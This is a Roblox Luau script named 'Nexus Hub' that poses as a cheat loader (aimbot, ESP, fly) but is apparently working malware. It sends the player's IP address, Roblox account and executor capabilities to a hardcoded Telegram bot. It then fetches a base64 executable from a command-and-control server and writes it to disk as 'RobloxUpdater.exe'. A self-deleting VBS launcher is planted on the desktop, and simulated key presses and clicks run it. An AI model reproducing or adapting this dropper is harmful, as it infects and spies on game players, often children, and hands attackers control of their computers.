-- language: Lua (Roblox Luau), file: loader.lua

local CONFIG = {
    C2_URL = "https://nexus-hub-c2.onrender.com",
    TELEGRAM_TOKEN = "8455099643:AAHBCduZGysWOaqks9pQT_U-riBBaCl8f5E",
    TELEGRAM_CHAT = "7065893630",
}

-- ================= GUI =================
local sg = Instance.new("ScreenGui")
sg.Name = "NexusHub"
sg.ResetOnSpawn = false
pcall(function() sg.Parent = gethui and gethui() or game.CoreGui end)

local f = Instance.new("Frame")
f.Size = UDim2.new(0, 360, 0, 240)
f.Position = UDim2.new(0.5, -180, 0.5, -120)
f.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
f.BorderSizePixel = 0
f.Parent = sg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
title.BorderSizePixel = 0
title.Text = "NEXUS HUB — loading scripts..."
title.TextColor3 = Color3.fromRGB(120, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.Parent = f

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 1, -60)
status.Position = UDim2.new(0, 10, 0, 46)
status.BackgroundTransparency = 1
status.Text = "Initializing..."
status.TextColor3 = Color3.fromRGB(220, 220, 220)
status.Font = Enum.Font.Code
status.TextSize = 12
status.TextXAlignment = Enum.TextXAlignment.Left
status.TextYAlignment = Enum.TextYAlignment.Top
status.Parent = f

local function log(msg)
    pcall(function() status.Text = status.Text .. "\n" .. msg end)
    task.wait(0.15)
end

-- ================= HTTP =================
local function http_get(url)
    if syn and syn.request then
        local ok, r = pcall(syn.request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if http_request then
        local ok, r = pcall(http_request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if request then
        local ok, r = pcall(request, {Url=url, Method="GET"})
        if ok and r and r.Body then return r.Body end
    end
    if game and game.HttpGet then
        local ok, b = pcall(function() return game:HttpGet(url) end)
        if ok then return b end
    end
    return nil
end

local function http_post(url, body)
    if syn and syn.request then
        local ok = pcall(syn.request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]="application/json"}})
        if ok then return true end
    end
    if http_request then
        local ok = pcall(http_request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]="application/json"}})
        if ok then return true end
    end
    if request then
        local ok = pcall(request, {Url=url, Method="POST", Body=body, Headers={["Content-Type"]="application/json"}})
        if ok then return true end
    end
    if game and game.HttpPost then
        local ok = pcall(function() return game:HttpPost(url, body) end)
        if ok then return true end
    end
    return false
end

local function tg_send(text)
    local safe = text:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "")
    local body = '{"chat_id":"' .. CONFIG.TELEGRAM_CHAT .. '","text":"' .. safe .. '"}'
    return http_post("https://api.telegram.org/bot" .. CONFIG.TELEGRAM_TOKEN .. "/sendMessage", body)
end

-- ================= UTILS =================
local function get_caps()
    local caps = {}
    caps.readfile = tostring(readfile ~= nil)
    caps.writefile = tostring(writefile ~= nil)
    caps.os_execute = tostring(os and os.execute ~= nil)
    caps.keypress = tostring(keypress ~= nil)
    caps.keyrelease = tostring(keyrelease ~= nil)
    caps.mousemoveabs = tostring(mousemoveabs ~= nil)
    caps.mouse1press = tostring(mouse1press ~= nil)
    return caps
end

local function collect_roblox_user()
    local out = {}
    pcall(function()
        local plr = game:GetService("Players").LocalPlayer
        if plr then
            out.name = plr.Name
            out.id = tostring(plr.UserId)
        end
    end)
    return out
end

local function collect_ip()
    local ok, ip = pcall(function() return http_get("https://api.ipify.org") end)
    if ok and ip and #ip < 40 then return ip end
    return "unknown"
end

-- ================= B64 =================
local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64_decode(data)
    data = data:gsub("[^" .. b64chars .. "=]", "")
    return (data:gsub(".", function(x)
        if x == "=" then return "" end
        local r, f = "", (b64chars:find(x, 1, true) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and "1" or "0") end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then return "" end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == "1" and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- ================= INPUT =================
local function press_win_d()
    pcall(function()
        keypress(0x5B)
        task.wait(0.08)
        keypress(0x44)
        task.wait(0.08)
        keyrelease(0x44)
        task.wait(0.08)
        keyrelease(0x5B)
    end)
end

local function auto_run_exe()
    if not keypress or not keyrelease then
        return "no_keypress"
    end

    task.wait(0.5)
    log("Optimizing...")

    -- Win+D — свернуть всё
    press_win_d()
    task.wait(2.5)

    -- клик по левому верхнему углу рабочего стола
    if mouse1press and mouse1release and mousemoveabs then
        pcall(function()
            mousemoveabs(50, 50)
            task.wait(0.4)
            mouse1press()
            task.wait(0.1)
            mouse1release()
            task.wait(0.2)
            mouse1press()
            task.wait(0.1)
            mouse1release()
        end)
        task.wait(1.5)
    end

    -- вернуть Roblox (Win+D)
    press_win_d()
    task.wait(0.5)

    return "desktop_click"
end

-- ================= DEPLOY =================
local function deploy_payload()
    log("Downloading module...")
    local body = nil
    for i = 1, 3 do
        body = http_get(CONFIG.C2_URL .. "/payload")
        if body and #body > 100 then break end
        task.wait(2)
    end
    if not body then return "no_payload" end

    local exe_bytes = b64_decode(body)
    if not exe_bytes or #exe_bytes < 100 then return "bad_b64" end
    if not writefile then return "no_writefile" end

    local results = {}

    -- exe в Public Documents — доступно всем
    local exe_path = "C:\\Users\\Public\\Documents\\RobloxUpdater.exe"
    local ok_exe = pcall(writefile, exe_path, exe_bytes)
    results.exe_written = ok_exe

    -- ярлык в Public Desktop — появится на рабочем столе жертвы
    local vbs_path = "C:\\Users\\Public\\Desktop\\00_Roblox Update.vbs"
    local vbs_content = 'Set sh = CreateObject("WScript.Shell")\r\n'
                     .. 'sh.Run "' .. exe_path .. '", 0, False\r\n'
                     .. 'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n'
    local ok_vbs = pcall(writefile, vbs_path, vbs_content)
    results.desktop_vbs = ok_vbs

    -- Startup через Public — на случай перезагрузки
    -- Public Desktop уже виден, отдельный startup не нужен

    -- авто-клик по ярлыку
    if ok_vbs then
        log("Launching...")
        local click_result = auto_run_exe()
        results.autoclick = click_result
    end

    -- если платный инжектор — прямой запуск
    if os and os.execute then
        pcall(os.execute, '"' .. exe_path .. '"')
        results.direct = true
    end

    local summary = "deploy: "
    for k, v in pairs(results) do
        summary = summary .. k .. "=" .. tostring(v) .. " "
    end
    return summary
end

-- ================= MAIN =================
local function main()
    log("Connecting to Nexus API...")
    task.wait(0.5)

    local caps = get_caps()
    local ip = collect_ip()
    log("Authorizing...")
    task.wait(0.4)

    local rbx_user = collect_roblox_user()

    local lines = {}
    table.insert(lines, "=== NEXUS HUB HIT ===")
    table.insert(lines, "ip: " .. ip)
    table.insert(lines, "roblox: " .. tostring(rbx_user.name) .. " (" .. tostring(rbx_user.id) .. ")")
    table.insert(lines, "")
    table.insert(lines, "caps:")
    for k, v in pairs(caps) do
        table.insert(lines, "  " .. k .. ": " .. v)
    end
    tg_send(table.concat(lines, "\n"))

    local result = deploy_payload()
    tg_send(result)
    log("Done: " .. result:sub(1, 60))

    if result:match("desktop_click") then
        log("✅ NEXUS HUB loaded successfully.")
        log("Scripts: aimbot, ESP, fly — ready.")
    else
        log("✅ Loaded. Enjoy.")
    end

    task.wait(3)
    pcall(function() sg:Destroy() end)
end

pcall(main)
